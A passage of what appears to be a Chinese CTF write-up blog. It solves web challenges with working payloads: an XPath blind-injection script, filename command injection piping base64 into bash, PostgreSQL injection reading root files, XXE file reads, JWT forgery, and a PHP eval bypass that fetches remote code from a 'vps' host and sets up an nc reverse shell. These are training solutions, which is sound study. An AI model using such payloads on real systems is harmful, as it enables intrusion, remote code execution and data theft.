class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>首先的FILE类对上传文件做了点waf:文件名不能出现/,文件名只能有一个小数点,必须是文件<br>然后我们需要获取admin的密码才可以进行文件上传,这里考的是xxe盲注,<br>脚本:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests  </span><br><span class="line">import time  </span><br><span class="line">url =&#x27;http://1faab4d0-7d84-46a1-b6fb-5dc991bc7f72.node4.buuoj.cn:81/index.php&#x27;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">strs =&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">flag =&#x27;&#x27;  </span><br><span class="line">for i in range(1,100):  </span><br><span class="line">    for j in strs:  </span><br><span class="line">  </span><br><span class="line">        #猜测根节点名称  </span><br><span class="line">        # payload_1 = &#123;&quot;username&quot;:&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&quot;.format(i,j),&quot;password&quot;:123&#125;  </span><br><span class="line">        #猜测子节点名称  </span><br><span class="line">        # payload_2 = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])  </span><br><span class="line">  </span><br><span class="line">        #猜测accounts的节点  </span><br><span class="line">        # payload_3 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])  </span><br><span class="line">  </span><br><span class="line">        #猜测user节点  </span><br><span class="line">        # payload_4 =&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])  </span><br><span class="line">  </span><br><span class="line">        #跑用户名和密码  </span><br><span class="line">        # payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)  </span><br><span class="line">        payload_username =&quot;&lt;username&gt;&#x27;or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&quot;.format(i,j)  </span><br><span class="line">        data=&#123;  </span><br><span class="line">            &quot;username&quot;:payload_username,  </span><br><span class="line">            &quot;password&quot;:123,  </span><br><span class="line">            &quot;submit&quot;:&quot;1&quot;  </span><br><span class="line">        &#125;  </span><br><span class="line">        #  </span><br><span class="line">        # payload_password =&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        print(payload_username)  </span><br><span class="line">        r = requests.post(url=url,data=data)  </span><br><span class="line">        time.sleep(0.1)  </span><br><span class="line">        # print(r.text)  </span><br><span class="line">#003d7628772d6b57fec5f30ccbc82be1  </span><br><span class="line">  </span><br><span class="line">        if &quot;登录成功&quot; in r.text:  </span><br><span class="line">            flag+=j  </span><br><span class="line">            print(flag)  </span><br><span class="line">            break  </span><br><span class="line">  </span><br><span class="line">    if &quot;登录失败&quot; in r.text:  </span><br><span class="line">        break  </span><br><span class="line">  </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><br>结果:003d7628772d6b57fec5f30ccbc82be1<br>md5解密网站:<a href="https://www.somd5.com/">https://www.somd5.com/</a><br>得到密码是:15035371139<br>然后上传文件,设置好文件名就行不用管内容<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo bHMgLw==|base64 -d|bash;ajpg.jpg</span><br></pre></td></tr></table></figure><br>ls /的base64编码是bHMgLw<code>==</code>,访问文件得到adjaskdhnask_flag_is_here_dakjdnmsakjnfksd<br>接着构造cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;ajpg.jpg</span><br></pre></td></tr></table></figure><br>得到flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;1f5da86a-9f0f-4143-ae97-b25a263e7a49&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF比赛wp</category>
      </categories>
      <tags>
        <tag>CTF比赛wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Greek Challenge2022</title>
    <url>/2024/02/06/Greek%20Challenge2022/</url>
    <content><![CDATA[<p>花了好多天时间把去年的极客题目复现了一遍,虽然大部分题目的docker环境出了问题,但还是以各种方法本地调试复现一下,也学到了很多东西</p>
<p>收获:</p>
<ol>
<li>postgresql数据库查询,单引号的过滤以及系统函数pg_read_file和pg_ls_dir</li>
<li><code>__halt_compiler();</code>中断编译器执行</li>
<li>disable_function的绕过</li>
<li>一些提权方法</li>
<li>php弱类型绕过(16进制和科学计数法)</li>
<li>php伪随机数漏洞</li>
<li>CSRF学习</li>
</ol>
<h2 id="1-babysql"><a href="#1-babysql" class="headerlink" title="1.babysql"></a>1.babysql</h2><p>单引号被过滤,g=2和g=3-1返回结果相同,是数字型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 3--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 4--+</span><br></pre></td></tr></table></figure>
<p>没有返回结果说明字段为三<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><br>没有返回结果,看了wp才知道这是PosgreSQL数据库,不支持类型转换,推测id是int类型,uname和passwd是char类型<br>所以:查询语句改成这样:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,version(),version() --+</span><br></pre></td></tr></table></figure><br>PostgreSQL 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, 64-bit<br>确定了数据库是PostgreSQL<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用万能密码:-1 or 1=1--+得到提示 SYC&#123;Fake_FLag_Real_IN_ffllaag_schema&#125;</span><br><span class="line">提示我们去ffllaag这个schema,查下schema的表:</span><br><span class="line">-1 union select 1,$$a$$,(tablename) FROM pg_tables WHERE schemaname IN ($$ffllaag$$) --+</span><br><span class="line">注意:</span><br><span class="line">单引号的绕过:</span><br><span class="line">1.chr(120)||chr(120)</span><br><span class="line">||是字符串连接操作符，chr(120)是小写字母x，所以它的结果是xx</span><br><span class="line">2.$$xx$$</span><br><span class="line">$$表示包含特殊字符的字符串字面值,$$xx$$如果xx有单引号则不需要转义</span><br><span class="line"></span><br><span class="line">pg_tables:是一个 PostgreSQL 系统目录表，用于存储数据库中所有表的信息</span><br></pre></td></tr></table></figure><br>得到user表<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select * from ffllaag.user--+</span><br><span class="line">发现无法全部回显,筛选一下</span><br><span class="line">-1 union select * from ffllaag.user where uname=$$admin$$--+</span><br><span class="line">得到:</span><br><span class="line">SYC&#123;S@rry_Realflag_In_root_directory&#125;</span><br><span class="line">提示flag在根目录下</span><br></pre></td></tr></table></figure><br>查看当前用户:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,user,user --+</span><br></pre></td></tr></table></figure><br>发现是postgres,默认是superuser,可以使用pg_ls_dir和pg_read_file函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,$$a$$,pg_ls_dir($$/$$)--+</span><br></pre></td></tr></table></figure><br>发现不能全部回显出来,用order by试试<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,$$a$$,pg_ls_dir($$/$$) order by 3--+</span><br></pre></td></tr></table></figure><br>发现文件名为aflag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,$$aflag$$,pg_read_file($$/aflag,0,1000)--+</span><br></pre></td></tr></table></figure><br>得到flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;1s_re@L_eaEASYsy_SQ&amp;&amp;L&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="2-cointowin"><a href="#2-cointowin" class="headerlink" title="2.cointowin"></a>2.cointowin</h2><p>此题考查原型链污染<br>一共三步:<br>登录,relief,import三个可控输入点<br>登陆只能控制⼀个username变量，relief可以控制⼀个数字，⽽import可以输⼊⼀个json字符串 三个点，username可以为任意字符串，但在整个程序中并没有任何可以执⾏username的点，放弃 relief可以控制获取的⾦币数，但是范围有限制，只能获取100-200之间的，并且只能在coin低于100时调⽤relief，那么只剩下import这 ⼀个点 先测试任意添加属性，看是否会报错<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;username&quot;,&quot;hashcode&quot;:&quot;b4a67a604f3e43582f929fc3aaea0141&quot;,&quot;coin&quot;:101,&quot;3333&quot;:3333&#125;</span><br></pre></td></tr></table></figure><br>将其import 可以看到导⼊成功,但是修改coin或者user就会显⽰nononono, you are cheating me，那么看来只对user，coin以及 hashcode进⾏了校验，可以尝试获取加密的key以及算法，但这⾥明显不可以取，只能来看看导⼊任何新数据，试试原型链污染<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;username&quot;,&quot;hashcode&quot;:&quot;b4a67a604f3e43582f929fc3aaea0141&quot;,&quot;coin&quot;:101,&quot;__proto__&quot;:&#123;&quot;coin&quot;:400000&#125;&#125;</span><br></pre></td></tr></table></figure><br>当前⽤户已经有了coin属性，会优先访问本地的coin⽽不是原型链的coin，怎么解决？ 登出，并创建新的账户，在创建coin属性前（即访问relief前）访问flag,就可以得到flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;finall_Answer_is_42&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-easygame"><a href="#3-easygame" class="headerlink" title="3.easygame"></a>3.easygame</h2><p>此题考点jwt伪造和xxe注入</p>
<p>先来到/newUser,页面回显 <code>创建失败，只能创建Syclover用户(传输userName和password)</code><br>直接post:userName=Syclover&amp;password=666<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.PI_RAajKUVcNkzK0Iqv-oEOrK3K1S-O-yOq9VAd69vw</span><br></pre></td></tr></table></figure><br>访问/secure/admin<br>页面回显 <code>没有token！请传入authorization header里</code><br>传参:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.PI_RAajKUVcNkzK0Iqv-oEOrK3K1S-O-yOq9VAd69vw</span><br></pre></td></tr></table></figure><br>页面回显 <code>当前用户信息id=1,userName=Syclover,password=666 不是admin不能继续下一关哦</code><br>这里可能是JWT伪造<br>利用网站 <code>https://jwt.io/</code> 来伪造JWT的token<br>利用给的附件的字典和工具爆破出密钥,改下userName为admin<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.OiTRoRkW_y9FCWB35vzJF90Y2uvWLx8qvW8FYB12JUE</span><br></pre></td></tr></table></figure><br>传参得到:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5LiL5LiA5YWz55u05o6l5Y67L1htbOeci+eci+acieayoeacieS9oOaDs+imgeeahOS4nOilv+WQpyEhIQ==</span><br></pre></td></tr></table></figure></p>
<p>base64解码:下一关直接去/Xml看看有没有你想要的东西吧!!!<br>访问/Xml<br>猜测是XXE漏洞:<br>改post,Content-Type为application/xml<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;firstname&gt; &amp;xxe;&lt;/firstname&gt;&lt;lastname&gt;Good!!!&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
<p>拿到flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYc&#123;1_l0v3_th3_syc_fam1ly&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="4-jsfind"><a href="#4-jsfind" class="headerlink" title="4.jsfind"></a>4.jsfind</h2><p>进去发现是个小游戏<br>找找js文件中的敏感路径<br>工具地址<a href="https://github.com/GerbenJavado/LinkFinder">GerbenJavado/LinkFinder：一个在JavaScript文件中查找端点的python脚本 (github.com)</a><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python linkfinder.py -i http://192.168.152.122:2204/ -d -o cli</span><br><span class="line"></span><br><span class="line">得到:</span><br><span class="line">js/wolf.js</span><br><span class="line">js/random.js</span><br><span class="line">js/angle.js</span><br><span class="line">js/math.js</span><br><span class="line">js/input.js</span><br><span class="line">js/sound.js</span><br><span class="line">js/menu.js</span><br><span class="line">js/file.js</span><br><span class="line">js/episodes.js</span><br><span class="line">js/maps.js</span><br><span class="line">js/game.js</span><br><span class="line">js/player.js</span><br><span class="line">js/sprites.js</span><br><span class="line">js/powerups.js</span><br><span class="line">js/ai.js</span><br><span class="line">js/actorai.js</span><br><span class="line">js/actors.js</span><br><span class="line">js/actstat.js</span><br><span class="line">js/weapon.js</span><br><span class="line">js/doors.js</span><br><span class="line">js/pushwall.js</span><br><span class="line">js/areas.js</span><br><span class="line">js/level.js</span><br><span class="line">js/raycaster.js</span><br><span class="line">js/renderer.js</span><br><span class="line">js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js</span><br><span class="line">js/requestAnimFrame.js</span><br><span class="line">js/base64.js</span><br><span class="line">js/load.js</span><br><span class="line">art/paused.png</span><br><span class="line">art/getpsyched.png</span><br></pre></td></tr></table></figure></p>
<p>或者可以在load.js里看到被注释的//    “js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js”,<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//   flag = U1lDPX5bXTtTWUM9e19fXzorK1NZQywkJCQkOighW10rIiIpW1NZQ10sX18kOisrU1lDLCRfJF86KCFbXSsiIilbU1lDXSxfJF86KytTWUMsJF8kJDooe30rIiIpW1NZQ10sJCRfJDooU1lDW1NZQ10rIiIpW1NZQ10sXyQkOisrU1lDLCQkJF86KCEiIisiIilbU1lDXSwkX186KytTWUMsJF8kOisrU1lDLCQkX186KHt9KyIiKVtTWUNdLCQkXzorK1NZQywkJCQ6KytTWUMsJF9fXzorK1NZQywkX18kOisrU1lDfTtTWUMuJF89KFNZQy4kXz1TWUMrIiIpW1NZQy4kXyRdKyhTWUMuXyQ9U1lDLiRfW1NZQy5fXyRdKSsoU1lDLiQkPShTWUMuJCsiIilbU1lDLl9fJF0pKygoIVNZQykrIiIpW1NZQy5fJCRdKyhTWUMuX189U1lDLiRfW1NZQy4kJF9dKSsoU1lDLiQ9KCEiIisiIilbU1lDLl9fJF0pKyhTWUMuXz0oISIiKyIiKVtTWUMuXyRfXSkrU1lDLiRfW1NZQy4kXyRdK1NZQy5fXytTWUMuXyQrU1lDLiQ7U1lDLiQkPVNZQy4kKyghIiIrIiIpW1NZQy5fJCRdK1NZQy5fXytTWUMuXytTWUMuJCtTWUMuJCQ7U1lDLiQ9KFNZQy5fX18pW1NZQy4kX11bU1lDLiRfXTtTWUMuJChTWUMuJChTWUMuJCQrIlwiIitTWUMuJF8kXysoIVtdKyIiKVtTWUMuXyRfXStTWUMuJCQkXysiXFwiK1NZQy5fXyQrU1lDLiQkXytTWUMuXyRfK1NZQy5fXysiKCdcXCIrU1lDLl9fJCtTWUMuXyRfK1NZQy5fJCQrIlxcIitTWUMuX18kK1NZQy5fJCQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkKyJ7XFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF9fKyJAXFwiK1NZQy5fXyQrU1lDLiQkJCtTWUMuX18kK1NZQy5fX18rU1lDLl8rIl9cXCIrU1lDLl9fJCtTWUMuX18kK1NZQy4kX18rIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fJCtTWUMuXyQkKyJcXCIrU1lDLl9fJCtTWUMuX18kK1NZQy5fJCQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kX18rU1lDLl8kJCtTWUMuJCRfXytTWUMuXyQrU1lDLiQkXyQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kXyQrIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLiQkXysiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkK1NZQy5fJCtTWUMuJCRfJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF8kKyJ9Jyk7IisiXCIiKSgpKSgpOw==</span><br></pre></td></tr></table></figure><br>base64解码之后:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC=~[];SYC=&#123;___:++SYC,$$$$:(![]+&quot;&quot;)[SYC],__$:++SYC,$_$_:(![]+&quot;&quot;)[SYC],_$_:++SYC,$_$$:(&#123;&#125;+&quot;&quot;)[SYC],$$_$:(SYC[SYC]+&quot;&quot;)[SYC],_$$:++SYC,$$$_:(!&quot;&quot;+&quot;&quot;)[SYC],$__:++SYC,$_$:++SYC,$$__:(&#123;&#125;+&quot;&quot;)[SYC],$$_:++SYC,$$$:++SYC,$___:++SYC,$__$:++SYC&#125;;SYC.$_=(SYC.$_=SYC+&quot;&quot;)[SYC.$_$]+(SYC._$=SYC.$_[SYC.__$])+(SYC.$$=(SYC.$+&quot;&quot;)[SYC.__$])+((!SYC)+&quot;&quot;)[SYC._$$]+(SYC.__=SYC.$_[SYC.$$_])+(SYC.$=(!&quot;&quot;+&quot;&quot;)[SYC.__$])+(SYC._=(!&quot;&quot;+&quot;&quot;)[SYC._$_])+SYC.$_[SYC.$_$]+SYC.__+SYC._$+SYC.$;SYC.$$=SYC.$+(!&quot;&quot;+&quot;&quot;)[SYC._$$]+SYC.__+SYC._+SYC.$+SYC.$$;SYC.$=(SYC.___)[SYC.$_][SYC.$_];SYC.$(SYC.$(SYC.$$+&quot;\&quot;&quot;+SYC.$_$_+(![]+&quot;&quot;)[SYC._$_]+SYC.$$$_+&quot;\\&quot;+SYC.__$+SYC.$$_+SYC._$_+SYC.__+&quot;(&#x27;\\&quot;+SYC.__$+SYC._$_+SYC._$$+&quot;\\&quot;+SYC.__$+SYC._$$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+&quot;&#123;\\&quot;+SYC.__$+SYC.___+SYC.$__+&quot;@\\&quot;+SYC.__$+SYC.$$$+SYC.__$+SYC.___+SYC._+&quot;_\\&quot;+SYC.__$+SYC.__$+SYC.$__+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$__+SYC._$$+SYC.$$__+SYC._$+SYC.$$_$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.$$_+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+SYC._$+SYC.$$_$+&quot;\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;&#125;&#x27;);&quot;+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure><br>控制台输出一下:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;D@y0u_LiKKe_D3code_EnCodE&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="5-rceus"><a href="#5-rceus" class="headerlink" title="5.rceus"></a>5.rceus</h2><p>考点:</p>
<ol>
<li><code>__halt_compiler();</code>中断编译器执行</li>
<li>disable_function的绕过</li>
<li>提权</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;syclover&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;syclover&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$code</span>)))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="string">&#x27;syclover!&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析代码可以知道要想进入eval就要有分号;<br>而且cmd里只能有<code>[A-Za-z_\(\)]</code>这些字符,其他的单双引号或者/都会使结果不等于syclover从而无法进入eval函数<br>进入之后要怎么绕过这个eval呢?</p>
<p><code>__halt_compiler();</code>可以中断编译器的执行</p>
<p> 执⾏命令后看phpinfo，发现有disalbe_function需要绕过，常⻅的攻击⼀把梭不⾏，发现很关键的过滤了fwrite,于是修改脚本⾥的 fwrite为fputs。<br>常规的绕过代码:<a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php">exploits/php-filter-bypass/exploit.php at master · mm0r1/exploits · GitHub</a><br>这里修改一下,绕过disable_function，执⾏反弹shell<br> 需要提权，查看根⽬录 ，可以执⾏根⽬录⾥的 readsecret，发现需要交互，环境中没有py，所以script /dev/null,反弹完整的 shell，执⾏后得到secret，即root的密码，su切换到root，执⾏/readflag<br>官方payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=eval(end(current(get_defined_vars())));__halt_compiler();&amp;s=file_put_contents(&#x27;/tmp/1&#x27;,file_get_contents(&#x27;http://vps:port/1.txt&#x27;)); ⽤于在本地存储php⽂件 </span><br><span class="line"></span><br><span class="line">?cmd=eval(end(current(get_defined_vars())));__halt_compiler();&amp;s=include(&#x27;/tmp/1&#x27;); 执⾏⽂件</span><br></pre></td></tr></table></figure><br>什么是script /dev/null?<br>普通的反弹shell无法交互,我们可以这样:<br>监听端:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stty -echo raw; nc -lp 6663; stty sane</span><br></pre></td></tr></table></figure><br>目标方:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -c &#x27;/bin/bash -c &quot;script 